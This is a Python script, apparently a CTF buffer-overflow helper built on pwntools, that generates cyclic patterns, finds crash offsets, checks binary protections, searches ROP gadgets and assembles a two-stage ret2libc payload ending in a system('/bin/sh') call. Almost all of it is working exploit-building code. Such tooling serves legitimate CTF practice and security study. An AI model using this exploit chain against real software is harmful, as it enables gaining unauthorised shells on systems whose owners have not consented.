#!/usr/bin/env python3
"""
Buffer Overflow Helper — CTF Toolkit
Automates: pattern generation, offset finding, gadget search, ret2libc
Usage: python3 bof_helper.py --binary ./vuln [--find-offset] [--gadgets] [--ret2libc]
"""
from pwn import *
import subprocess, argparse, os, sys

def cyclic_test(binary: str, length: int = 512):
    """Generate cyclic pattern and attempt crash."""
    pattern = cyclic(length)
    print(f"[*] Sending cyclic pattern ({length} bytes) to {binary}")
    print(f"[*] Pattern start: {pattern[:20]}...")
    print("[*] Run the binary, crash it, then use --find-offset <crash_value>")
    with open("/tmp/ctf_pattern.txt", "wb") as f:
        f.write(pattern)
    print(f"[*] Pattern saved to /tmp/ctf_pattern.txt")
    print(f"    Run: ./{binary} < /tmp/ctf_pattern.txt")
    print(f"    Or via gdb: run < /tmp/ctf_pattern.txt")
    return pattern


def find_offset(crash_value: str) -> int:
    """Find offset from crash EIP/RIP value."""
    try:
        if crash_value.startswith("0x"):
            val = int(crash_value, 16)
            # Try both little-endian interpretations
            offset_64 = cyclic_find(p64(val))
            offset_32 = cyclic_find(p32(val & 0xffffffff))
            print(f"[+] Offset (64-bit): {offset_64}")
            print(f"[+] Offset (32-bit): {offset_32}")
            return offset_64
        else:
            # ASCII pattern like 'aaab'
            offset = cyclic_find(crash_value.encode())
            print(f"[+] Offset: {offset}")
            return offset
    except Exception as e:
        print(f"[-] Error: {e}")
        return -1


def checksec_binary(binary: str) -> dict:
    """Run checksec on binary."""
    elf = ELF(binary, checksec=False)
    protections = {
        "PIE":      elf.pie,
        "NX":       elf.nx,
        "Stack canary": elf.canary,
        "RELRO":    elf.relro,
        "Arch":     elf.arch,
        "Bits":     elf.bits,
    }
    print(f"\n[*] Checksec: {binary}")
    for k, v in protections.items():
        color = "\033[32m" if v else "\033[31m"
        print(f"  {color}{k}: {v}\033[0m")
    return protections


def find_gadgets(binary: str, gadgets: list = None) -> dict:
    """Find ROP gadgets using ROPgadget or pwntools."""
    if gadgets is None:
        gadgets = ["pop rdi", "pop rsi", "pop rdx", "pop rbp",
                   "ret", "syscall", "int 0x80",
                   "pop rdi; ret", "pop rsi; pop r15; ret"]
    elf = ELF(binary, checksec=False)
    rop = ROP(elf)
    print(f"\n[*] Looking for gadgets in {binary}:")
    found = {}
    for g in gadgets:
        try:
            gadget = rop.find_gadget(g.split())
            if gadget:
                print(f"  [+] {g!r}: {hex(gadget.address)}")
                found[g] = gadget.address
            else:
                print(f"  [-] {g!r}: not found")
        except Exception:
            pass
    return found


def build_ret2libc(binary: str, libc_path: str, offset: int):
    """Build ret2libc payload skeleton."""
    elf  = ELF(binary, checksec=False)
    libc = ELF(libc_path, checksec=False)
    rop  = ROP(elf)

    print("\n[*] Building ret2libc payload skeleton...")

    # Stage 1: leak libc via puts(puts@got)
    puts_plt = elf.plt.get("puts")
    puts_got = elf.got.get("puts")
    main_sym = elf.symbols.get("main") or elf.entry

    if not puts_plt or not puts_got:
        print("[-] puts not found in PLT/GOT — adapt manually")
        return

    pop_rdi = rop.find_gadget(["pop rdi", "ret"])
    ret     = rop.find_gadget(["ret"])

    print(f"  puts@plt:  {hex(puts_plt)}")
    print(f"  puts@got:  {hex(puts_got)}")
    print(f"  pop rdi:   {hex(pop_rdi.address) if pop_rdi else 'NOT FOUND'}")
    print(f"  main:      {hex(main_sym)}")

    if not pop_rdi:
        print("[-] pop rdi gadget not found")
        return

    stage1 = flat([
        b"A" * offset,
        ret.address if ret else b"",    # stack alignment
        pop_rdi.address,
        puts_got,
        puts_plt,
        main_sym,
    ])

    print(f"\n[*] Stage 1 payload ({len(stage1)} bytes):")
    print(f"    {stage1.hex()}")

    # Stage 2 (after leak)
    print("""
[*] Stage 2 template (after leak):
    puts_leak = u64(io.recvuntil(b'\\n', drop=True).ljust(8, b'\\x00'))
    libc.address = puts_leak - libc.symbols['puts']
    log.info(f"libc base: {hex(libc.address)}")
    binsh  = next(libc.search(b'/bin/sh\\x00'))
    system = libc.symbols['system']
    rop2   = ROP(libc)
    stage2 = flat([b'A' * offset, ret.address, pop_rdi.address, binsh, system])
""")


# ─── MAIN ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Buffer Overflow Helper")
    parser.add_argument("--binary",       required=True)
    parser.add_argument("--cyclic",       type=int, metavar="LEN", help="Generate cyclic pattern")
    parser.add_argument("--find-offset",  metavar="CRASH_VALUE")
    parser.add_argument("--checksec",     action="store_true")
    parser.add_argument("--gadgets",      action="store_true")
    parser.add_argument("--ret2libc",     metavar="LIBC_PATH")
    parser.add_argument("--offset",       type=int, default=0)
    args = parser.parse_args()

    if args.cyclic:
        cyclic_test(args.binary, args.cyclic)

    if args.find_offset:
        find_offset(args.find_offset)

    if args.checksec:
        checksec_binary(args.binary)

    if args.gadgets:
        find_gadgets(args.binary)

    if args.ret2libc:
        build_ret2libc(args.binary, args.ret2libc, args.offset)


if __name__ == "__main__":
    main()
